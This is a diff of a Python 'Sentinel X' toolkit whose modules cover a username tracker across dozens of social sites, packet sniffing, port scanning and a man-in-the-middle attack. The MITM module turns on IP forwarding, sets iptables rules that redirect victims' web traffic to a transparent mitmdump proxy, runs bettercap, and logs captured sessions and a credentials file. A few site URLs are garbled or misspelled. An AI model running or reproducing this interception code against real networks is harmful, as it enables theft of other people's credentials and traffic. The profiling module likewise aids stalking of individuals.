@@ -13,21 +13,17 @@ import subprocess
 import shutil
 import signal
 
-# --- DEPENDENCY CHECK ---
 try:
     from scapy.all import sniff, ARP, Ether, srp, conf
     conf.verb = 0 
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
-
-# --- SYSTEM INIT ---
 init(autoreset=True)
 engine = pyttsx3.init()
 engine.setProperty('rate', 160) 
 engine.setProperty('volume', 1.0)
 
-# --- UTILITIES ---
 def speak(text):
     try:
         engine.say(text)
@@ -46,14 +42,14 @@ def banner():
     ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║          ╚██╗██╔╝
     ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║           ╚███╔╝ 
     ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║           ██╔██╗ 
-    ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗██╗██╗██╔╝ ██╗
-    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝╚═╝╚═╝  ╚═╝
-                                            [ SYSTEM: ONLINE ]
+    ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗██╗ ██╔╝  ██╗
+    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝ ╚═╝   ╚═╝
+                                            [ Powered by: CyberOps ]
     """
     print(Fore.CYAN + Style.BRIGHT + logo)
     speak("Sentinel X interface loaded.")
 
-# --- 1. REAL OSINT TRACKER (30+ SITES) ---
+# --------------------------------------------------- 1. REAL OSINT TRACKER  ---------------------------------------------------------------------
 def osint_tracker():
     speak("Global OSINT Tracker initialized.")
     target = input(Fore.WHITE + "\nroot@sentinel:~/osint# Target Username: ")
@@ -61,68 +57,98 @@ def osint_tracker():
     print(Fore.CYAN + "\n[*] Initializing Search Threads for 30+ Platforms...")
     print(Fore.CYAN + "[*] Please wait, checking databases...\n")
     
-    # Headers to mimic a real browser (prevents blocking)
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
     }
 
-    # 30+ Real URLs
     sites = {
         "GitHub": f"https://github.com/{target}",
-        "Instagram": f"https://www.instagram.com/{target}/",
-        "Twitter": f"https://twitter.com/{target}",
+        "Instagram": f"https://www.instagram.com/{target}",
         "Facebook": f"https://www.facebook.com/{target}",
+        "Twitter": f"https://www.twitter.com/{target}",
+        "YouTube": f"https://www.youtube.com/{target}",
+        "Blogger": f"https://{target}.blogspot.com",
+        "GooglePlus": f"https://plus.google.com/+{target}/posts",
         "Reddit": f"https://www.reddit.com/user/{target}",
-        "TikTok": f"https://www.tiktok.com/@{target}",
-        "Pinterest": f"https://www.pinterest.com/{target}/",
-        "Telegram": f"https://t.me/{target}",
-        "GitLab": f"https://gitlab.com/{target}",
-        "BitBucket": f"https://bitbucket.org/{target}/",
-        "Medium": f"https://medium.com/@{target}",
-        "WordPress": f"https://{target}.wordpress.com/",
-        "Patreon": f"https://www.patreon.com/{target}",
+        "Wordpress": f"https://{target}.wordpress.com",
+        "Pinterest": f"https://www.pinterest.com/{target}",
+        "Github": f"https://www.github.com/{target}",
+        "Tumblr": f"https://{target}.tumblr.com",
+        "Flickr": f"https://www.flickr.com/photos/{target}",
+        "Steam": f"https://steamcommunity.com/id/{target}",
         "Vimeo": f"https://vimeo.com/{target}",
         "SoundCloud": f"https://soundcloud.com/{target}",
-        "Spotify": f"https://open.spotify.com/user/{target}",
-        "Steam": f"https://steamcommunity.com/id/{target}",
-        "Twitch": f"https://www.twitch.tv/{target}",
-        "Roblox": f"https://www.roblox.com/user.aspx?username={target}",
-        "DeviantArt": f"https://www.deviantart.com/{target}",
-        "Behance": f"https://www.behance.net/{target}",
-        "Dribbble": f"https://dribbble.com/{target}",
-        "Flickr": f"https://www.flickr.com/people/{target}/",
-        "Pastebin": f"https://pastebin.com/u/{target}",
-        "Wikipedia": f"https://en.wikipedia.org/wiki/User:{target}",
-        "HackerNews": f"https://news.ycombinator.com/user?id={target}",
+        "Disqus": f"https://disqus.com/{target}",
+        "Medium": f"https://medium.com/@{target}",
+        "DeviantART": f"https://{target}.deviantart.com",
+        "VK": f"https://vk.com/{target}",
         "About.me": f"https://about.me/{target}",
-        "Blogger": f"https://{target}.blogspot.com",
-        "Replit": f"https://replit.com/@{target}",
-        "Gumroad": f"https://gumroad.com/{target}",
-        "ProductHunt": f"https://www.producthunt.com/@{target}",
+        "Spotify": f"http://googleusercontent.com/spotify.com/{target}",
+        "MixCloud": f"https://www.mixcloud.com/{target}",
+        "Scribd": f"https://www.scribd.com/{target}",
+        "Badoo": f"https://www.badoo.com/en/{target}",
+        "Patreon": f"https://www.patreon.com/{target}",
+        "BitBucket": f"https://bitbucket.org/{target}",
+        "CashMe": f"https://cash.me/{target}",
+        "Behance": f"https://www.behance.net/{target}",
+        "GoodReads": f"https://www.goodreads.com/{target}",
+        "Instructables": f"https://www.instructables.com/member/{target}",
+        "Keybase": f"https://keybase.io/{target}",
+        "Kongregate": f"https://kongregate.com/accounts/{target}",
+        "LiveJournal": f"https://{target}.livejournal.com",
+        "AngelList": f"https://angel.co/{target}",
+        "last.fm": f"https://last.fm/user/{target}",
+        "Dribbble": f"https://dribbble.com/{target}",
+        "Codecademy": f"https://www.codecademy.com/{target}",
+        "Gravatar": f"https://en.gravatar.com/{target}",
+        "Pastebin": f"https://pastebin.com/u/{target}",
+        "Foursquare": f"https://foursquare.com/{target}",
+        "Roblox": f"https://www.roblox.com/user.aspx?username={target}",
+        "Gumroad": f"https://www.gumroad.com/{target}",
+        "Newgrounds": f"https://{target}.newgrounds.com",
         "Wattpad": f"https://www.wattpad.com/user/{target}",
-        "Canva": f"https://www.canva.com/p/{target}",
-        "CodePen": f"https://codepen.io/{target}"
+        "Canva": f"https://www.canva.com/{target}",
+        "CreativeMarket": f"https://creativemarket.com/{target}",
+        "Trakt": f"https://www.trakt.tv/users/{target}",
+        "500px": f"https://500px.com/{target}",
+        "Buzzfeed": f"https://buzzfeed.com/{target}",
+        "TripAdvisor": f"https://tripadvisor.com/members/{target}",
+        "HubPages": f"https://{target}.hubpages.com/",
+        "Contently": f"https://{target}.contently.com",
+        "Houzz": f"https://houzz.com/user/{target}",
+        "blip.fm": f"https://blip.fm/{target}",
+        "Wikipedia": f"https://www.wikipedia.org/wiki/User:{target}",
+        "HackerNews": f"https://news.ycombinator.com/user?id={target}",
+        "CodeMentor": f"https://www.codementor.io/{target}",
+        "ReverbNation": f"https://www.reverbnation.com/{target}",
+        "Designspiration": f"https://www.designspiration.net/{target}",
+        "Bandcamp": f"https://www.bandcamp.com/{target}",
+        "ColourLovers": f"https://www.colourlovers.com/love/{target}",
+        "IFTTT": f"https://www.ifttt.com/p/{target}",
+        "Ebay": f"https://www.ebay.com/usr/{target}",
+        "Slack": f"https://{target}.slack.com",
+        "OkCupid": f"https://www.okcupid.com/profile/{target}",
+        "Trip": f"https://www.trip.skyscanner.com/user/{target}",
+        "Ello": f"https://ello.co/{target}",
+        "Tracky": f"https://tracky.com/~{target}",
+        "Tripit": f"https://www.tripit.com/people/{target}#/profile/basic-info",
+        "Basecamp": f"https://{target}.basecamphq.com/login",
+        "BugCrowd": f"https://bugbrowd.com/h/{target}",
+        "Hackerone": f"https://hackerone.com/profile/{target}"
     }
 
     found_list = []
-    
-    # Threaded Function for Speed
+
     def check_site(site, url):
         try:
             r = requests.get(url, headers=headers, timeout=5)
-            # Most sites return 200 if found. Some (like TikTok) might require specific handling, 
-            # but 200 vs 404 is the standard check.
             if r.status_code == 200:
                 print(Fore.GREEN + f"[+] DETECTED: {site:<15} -> {url}")
                 found_list.append(site)
             elif r.status_code == 404:
-                # Optional: Print missing sites in Red if you want verbose output
-                # print(Fore.RED + f"[-] {site:<15} : NOT FOUND") 
                 pass
         except:
-            pass # Ignore connection errors
-
-    # Launch Threads
+            pass
     threads = []
     for site, url in sites.items():
         t = threading.Thread(target=check_site, args=(site, url))
@@ -164,7 +190,7 @@ def phishing_check():
     except Exception as e:
         print(Fore.RED + f"[!] SECURITY ALERT: {e}")
 
-# --- 3. REAL WEB RECON ---
+# ------------------------------------------------------ 3. REAL WEB RECON -----------------------------------------------------------------
 def web_pentest():
     speak("Web Recon initiated.")
     target = input(Fore.WHITE + "\nroot@sentinel:~/web# Enter URL: ")
@@ -212,7 +238,7 @@ def web_pentest():
     except Exception as e:
         log(f"Target unreachable: {e}", "ERROR")
 
-# --- 4. REAL NETWORK SNIFFER (SCAPY) ---
+# --------------------------------------------------------------------- 4. REAL NETWORK SNIFFER (SCAPY) -----------------------------------------------------------
 def network_sniffer():
     if not SCAPY_AVAILABLE:
         log("Scapy not installed. Run 'pip install scapy'.", "ERROR"); return
@@ -228,37 +254,31 @@ def network_sniffer():
             print(Fore.GREEN + f"[{p}] {ip.src} -> {ip.dst} : {len(packet)} bytes")
 
     try:
-        # Sniffs 20 packets then stops to avoid freezing loop
         sniff(prn=packet_callback, count=25)
         speak("Capture buffer full. Stopping.")
     except PermissionError:
         log("Run as Administrator to sniff packets!", "ERROR")
 
-# --- 5. REAL ARP NETWORK SCANNER (Replaces Fake MITM) ---
+# ------------------------------------------------------------------- 5. REAL ARP NETWORK SCANNER (Replaces Fake MITM) ----------------------------------------------------
 ## --- CORE UTILITY: TOOL CHECK ---
 def check_dependencies():
     essential_tools = ["bettercap", "mitmdump", "iptables"]
     missing = [tool for tool in essential_tools if not shutil.which(tool)]
     return missing
 
-# --- 5. FINAL ELITE MITM MODULE ---
 def mitm_simulation():
-    # 1. Pre-Flight Checks
     missing = check_dependencies()
     if missing:
         log(f"Missing tools: {', '.join(missing)}. Install them first!", "ALERT")
         return
 
     os.system('cls' if os.name == 'nt' else 'clear')
-    
-    # Professional Header
+
     print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
     print(f"{Fore.WHITE}   SENTINEL-X ELITE   |   INTERNAL NETWORK EXPLOITATION V3.0")
     print(f"{Fore.RED}" + "═"*65)
 
-    # 2. Interface & Target Setup
     try:
-        # Auto-detect interfaces
         ifaces = os.listdir('/sys/class/net/')
         print(f"{Fore.YELLOW}[*] Available Interfaces:")
         for i, iface in enumerate(ifaces):
@@ -267,7 +287,6 @@ def mitm_simulation():
         if_choice = int(input(f"\n{Fore.YELLOW}Select Interface ID: {Fore.WHITE}"))
         interface = ifaces[if_choice]
 
-        # Scan for targets automatically
         log(f"Broadcasting ARP on {interface}...", "INFO")
         from scapy.all import ARP, Ether, srp
         net_prefix = ".".join(os.popen("hostname -I").read().split()[0].split(".")[:-1]) + ".0/24"
@@ -288,29 +307,22 @@ def mitm_simulation():
     except Exception as e:
         log(f"Setup Error: {e}", "ERROR")
         return
-
-    # 3. Log Directory & Files
     log_folder = "sentinel_vault"
     if not os.path.exists(log_folder): os.makedirs(log_folder)
     
     session_id = datetime.now().strftime("%H%M%S")
     pcap_out = f"{log_folder}/session_{session_id}.pcap"
     cred_out = f"{log_folder}/creds_{session_id}.txt"
-
-    # 4. Attack Execution
     try:
         speak("Initializing elite interception engines.")
         log("Hardening Network Configuration...", "INFO")
         
-        # IP Forwarding & Iptables Cleanup
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        os.system("iptables -t nat -F") # Clear old rules
+        os.system("iptables -t nat -F") 
         
-        # Routing
         os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
         os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")
 
-        # Launching Mitmproxy (with Stream log)
         mitm_proc = subprocess.Popen(
             ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
@@ -324,7 +336,7 @@ def mitm_simulation():
         ]
         better_proc = subprocess.Popen(better_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        time.sleep(3) # Let engines warm up
+        time.sleep(3)
 
         # 5. DASHBOARD UI
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -344,28 +356,23 @@ def mitm_simulation():
         
 
         while True:
-            # Check if processes are still alive
             if mitm_proc.poll() is not None or better_proc.poll() is not None:
                 log("One of the engines crashed! Emergency exit.", "ALERT")
                 break
-                
-            # Live traffic animation
+
             for dot in [".  ", ".. ", "..."]:
                 print(f"{Fore.MAGENTA}\r[+] SNIFFING{dot}", end="")
                 time.sleep(0.5)
 
     except KeyboardInterrupt:
         print(f"\n\n{Fore.YELLOW}[!] TERMINATION SIGNAL RECEIVED.")
-        
-        # Graceful Shutdown
+
         better_proc.send_signal(signal.SIGINT)
         mitm_proc.send_signal(signal.SIGINT)
         time.sleep(2)
         
         better_proc.terminate()
         mitm_proc.terminate()
-
-        # Final Cleanup
         log("Restoring Network Settings...", "INFO")
         os.system("iptables -t nat -F")
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -379,7 +386,7 @@ def mitm_simulation():
         time.sleep(3)
         banner()
 
-# --- 6. REAL MULTI-THREADED PORT SCANNER ---
+# ---------------------------------------------------------------- 6. REAL MULTI-THREADED PORT SCANNER --------------------------------------------------------------
 def port_scanner():
     speak("Port Scanner initialized.")
     target = input(Fore.WHITE + "\nroot@sentinel:~/nmap# Enter Target IP: ")
@@ -397,8 +404,6 @@ def port_scanner():
                 active_ports.append(port)
             s.close()
         except: pass
-
-    # Scanning top 100 ports for speed
     threads = []
     for port in range(1, 101):
         t = threading.Thread(target=scan_port, args=(port,))
@@ -411,7 +416,6 @@ def port_scanner():
         log("No open ports found or firewall active.", "WARN")
     speak("Port scan finished.")
 
-# --- MAIN LOOP ---
 def main():
     startup_sequence()
     
@@ -441,5 +445,7 @@ def main():
 
 if __name__ == "__main__": 
     main()
+
+
 
 
